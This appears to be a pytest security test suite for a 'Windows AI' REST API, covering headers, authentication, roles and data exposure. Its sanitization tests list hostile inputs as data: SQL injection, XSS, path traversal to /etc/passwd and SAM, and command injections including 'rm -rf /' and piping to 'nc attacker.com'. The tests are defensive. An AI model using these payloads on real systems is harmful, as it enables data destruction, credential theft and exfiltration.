"""
Windows AI - API Security Tests
Comprehensive security tests for REST API endpoints.

All tests marked with @pytest.mark.critical - these tests BLOCK merges.
"""

import pytest
from fastapi.testclient import TestClient
from typing import Dict, Any
import jwt
import time


pytestmark = pytest.mark.critical  # Mark all tests in this file as critical


class TestAPISecurityHeaders:
    """Test that API returns proper security headers."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from windows_ai.api.server import app
        return TestClient(app)

    def test_security_headers_present(self, client):
        """
        Test that security headers are set on all responses.
        
        Required Headers:
        - X-Content-Type-Options: nosniff
        - X-Frame-Options: DENY
        - X-XSS-Protection: 1; mode=block
        - Strict-Transport-Security: max-age=31536000
        - Content-Security-Policy
        """
        response = client.get("/api/health")
        
        assert "x-content-type-options" in response.headers
        assert response.headers["x-content-type-options"] == "nosniff"
        
        assert "x-frame-options" in response.headers
        assert response.headers["x-frame-options"] == "DENY"
        
        assert "x-xss-protection" in response.headers
        
        # HSTS should be present
        assert "strict-transport-security" in response.headers

    def test_cors_configuration(self, client):
        """
        Test that CORS is properly configured.
        
        Security Requirement:
        - CORS should only allow trusted origins
        - Wildcard (*) should not be used in production
        """
        response = client.options("/api/plugins")
        
        if "access-control-allow-origin" in response.headers:
            origin = response.headers["access-control-allow-origin"]
            # Should not be wildcard in production
            assert origin != "*" or "test" in str(client.base_url), \
                "CORS should not allow all origins in production"


class TestAPIAuthenticationFlows:
    """Test various authentication flows and edge cases."""

    @pytest.fixture
    def client(self):
        from windows_ai.api.server import app
        return TestClient(app)

    def test_login_with_valid_credentials(self, client):
        """Test successful login returns valid token."""
        response = client.post("/api/auth/login", json={
            "username": "test_user",
            "password": "test_password"
        })
        
        if response.status_code == 200:
            data = response.json()
            assert "access_token" in data
            assert "token_type" in data
            assert data["token_type"] == "bearer"

    def test_login_with_invalid_credentials(self, client):
        """Test login with wrong credentials fails."""
        response = client.post("/api/auth/login", json={
            "username": "test_user",
            "password": "wrong_password"
        })
        
        assert response.status_code == 401

    def test_login_rate_limiting(self, client):
        """
        Test that failed login attempts are rate-limited.
        
        Security Requirement:
        - Failed logins should trigger rate limiting
        - Prevents brute force attacks
        """
        # Attempt many failed logins
        for i in range(10):
            response = client.post("/api/auth/login", json={
                "username": "test_user",
                "password": f"wrong_password_{i}"
            })
        
        # Eventually should get rate limited
        response = client.post("/api/auth/login", json={
            "username": "test_user",
            "password": "wrong_password"
        })
        
        # Should be rate limited
        assert response.status_code in [429, 403], "Should be rate limited after multiple failures"

    def test_token_expiration(self, client):
        """
        Test that tokens expire after specified time.
        
        Security Requirement:
        - Tokens must have expiration time
        - Expired tokens must be rejected
        """
        # Get valid token
        login_response = client.post("/api/auth/login", json={
            "username": "test_user",
            "password": "test_password"
        })
        
        if login_response.status_code == 200:
            token = login_response.json()["access_token"]
            
            # Decode token to check expiration
            try:
                payload = jwt.decode(token, options={"verify_signature": False})
                assert "exp" in payload, "Token should have expiration"
                
                # Expiration should be in the future
                assert payload["exp"] > time.time(), "Token expiration should be in future"
            except jwt.DecodeError:
                pytest.skip("Token format not JWT")

    def test_token_refresh(self, client):
        """Test token refresh mechanism."""
        # Get initial token
        login_response = client.post("/api/auth/login", json={
            "username": "test_user",
            "password": "test_password"
        })
        
        if login_response.status_code == 200:
            old_token = login_response.json()["access_token"]
            
            # Refresh token
            refresh_response = client.post("/api/auth/refresh", headers={
                "Authorization": f"Bearer {old_token}"
            })
            
            if refresh_response.status_code == 200:
                new_token = refresh_response.json()["access_token"]
                assert new_token != old_token, "Refreshed token should be different"


class TestAPIAuthorizationRoles:
    """Test role-based authorization."""

    @pytest.fixture
    def client(self):
        from windows_ai.api.server import app
        return TestClient(app)

    @pytest.fixture
    def admin_token(self, client):
        """Get admin token."""
        response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin_password"
        })
        if response.status_code == 200:
            return response.json()["access_token"]
        return None

    @pytest.fixture
    def user_token(self, client):
        """Get regular user token."""
        response = client.post("/api/auth/login", json={
            "username": "user",
            "password": "user_password"
        })
        if response.status_code == 200:
            return response.json()["access_token"]
        return None

    def test_admin_only_endpoints(self, client, admin_token, user_token):
        """
        Test that admin-only endpoints reject non-admin users.
        
        Admin-only endpoints:
        - /api/admin/users
        - /api/admin/config
        - /api/admin/logs
        """
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/config",
            "/api/admin/logs",
        ]
        
        for endpoint in admin_endpoints:
            # Regular user should be denied
            if user_token:
                response = client.get(endpoint, headers={
                    "Authorization": f"Bearer {user_token}"
                })
                assert response.status_code == 403, f"User should not access {endpoint}"
            
            # Admin should have access
            if admin_token:
                response = client.get(endpoint, headers={
                    "Authorization": f"Bearer {admin_token}"
                })
                assert response.status_code != 403, f"Admin should access {endpoint}"

    def test_user_resource_ownership(self, client, user_token):
        """
        Test that users can only modify their own resources.
        
        Security Requirement:
        - Users cannot modify other users' plugins/agents/tasks
        - Ownership must be validated on all modifications
        """
        if not user_token:
            pytest.skip("User token not available")
        
        # Try to delete another user's plugin
        response = client.delete("/api/plugins/other_user_plugin", headers={
            "Authorization": f"Bearer {user_token}"
        })
        
        # Should be forbidden (not owner)
        assert response.status_code in [403, 404], "Should not delete other user's plugin"


class TestAPIInputSanitization:
    """Test input sanitization and validation."""

    @pytest.fixture
    def client(self):
        from windows_ai.api.server import app
        return TestClient(app)

    def test_sql_injection_in_query_params(self, client):
        """Test SQL injection prevention in query parameters."""
        sql_injections = [
            "'; DROP TABLE plugins; --",
            "1' OR '1'='1",
            "admin' --",
            "' UNION SELECT * FROM users --",
        ]
        
        for injection in sql_injections:
            response = client.get(f"/api/plugins?name={injection}")
            # Should not cause server error
            assert response.status_code != 500, f"SQL injection caused error: {injection}"

    def test_xss_in_post_data(self, client):
        """Test XSS prevention in POST data."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
        ]
        
        for payload in xss_payloads:
            response = client.post("/api/plugins", json={
                "name": payload,
                "description": payload,
                "code": "pass"
            })
            
            if response.status_code == 200:
                data = response.json()
                # Payload should be escaped in response
                assert "<script>" not in str(data), f"XSS payload not escaped: {payload}"

    def test_path_traversal_in_file_operations(self, client):
        """Test path traversal prevention in file operations."""
        traversal_attempts = [
            "../../etc/passwd",
            "../../../Windows/System32/config/SAM",
            "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        
        for path in traversal_attempts:
            response = client.get(f"/api/files/{path}")
            # Should reject or normalize path
            assert response.status_code in [400, 403, 404], f"Path traversal not prevented: {path}"

    def test_command_injection_in_agent_tasks(self, client):
        """Test command injection prevention in agent tasks."""
        command_injections = [
            "test && rm -rf /",
            "test; cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
        ]
        
        for cmd in command_injections:
            response = client.post("/api/agents/tasks", json={
                "type": "execute_command",
                "command": cmd
            })
            
            # Should reject dangerous commands
            assert response.status_code in [400, 403], f"Command injection not prevented: {cmd}"

    def test_json_payload_validation(self, client):
        """Test that JSON payloads are validated."""
        invalid_payloads = [
            {"invalid": "no required fields"},
            {"name": None, "code": None},  # Invalid types
            {"name": "x" * 10000, "code": "pass"},  # Too long
        ]
        
        for payload in invalid_payloads:
            response = client.post("/api/plugins", json=payload)
            assert response.status_code in [400, 422], "Invalid payload should be rejected"


class TestAPIDataExposure:
    """Test that API doesn't expose sensitive data."""

    @pytest.fixture
    def client(self):
        from windows_ai.api.server import app
        return TestClient(app)

    def test_error_messages_no_sensitive_data(self, client):
        """
        Test that error messages don't leak sensitive information.
        
        Security Requirement:
        - Error messages should not contain:
          - Stack traces
          - Database queries
          - File paths
          - Internal IP addresses
        """
        # Cause an error
        response = client.get("/api/plugins/nonexistent_plugin_12345")
        
        if response.status_code >= 400:
            error_text = response.text.lower()
            
            # Should not contain sensitive info
            sensitive_patterns = [
                "traceback",
                "c:\\users",
                "/home/",
                "192.168.",
                "select * from",
                "database",
                "sql",
            ]
            
            for pattern in sensitive_patterns:
                assert pattern not in error_text, f"Error message contains sensitive data: {pattern}"

    def test_user_enumeration_prevention(self, client):
        """
        Test that API doesn't allow user enumeration.
        
        Security Requirement:
        - Login endpoint should not reveal if username exists
        - Same error message for invalid username and invalid password
        """
        # Try nonexistent user
        response1 = client.post("/api/auth/login", json={
            "username": "nonexistent_user_12345",
            "password": "password"
        })
        
        # Try existing user with wrong password
        response2 = client.post("/api/auth/login", json={
            "username": "test_user",
            "password": "wrong_password"
        })
        
        # Both should return same status code and similar message
        assert response1.status_code == response2.status_code, \
            "Login responses should not reveal user existence"

    def test_api_version_disclosure(self, client):
        """Test that API doesn't disclose unnecessary version information."""
        response = client.get("/api/health")
        
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        # Should not have Server header revealing technology stack
        if "server" in headers_lower:
            server = headers_lower["server"]
            # Should not contain version numbers
            assert not any(char.isdigit() for char in server), \
                "Server header should not reveal version"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
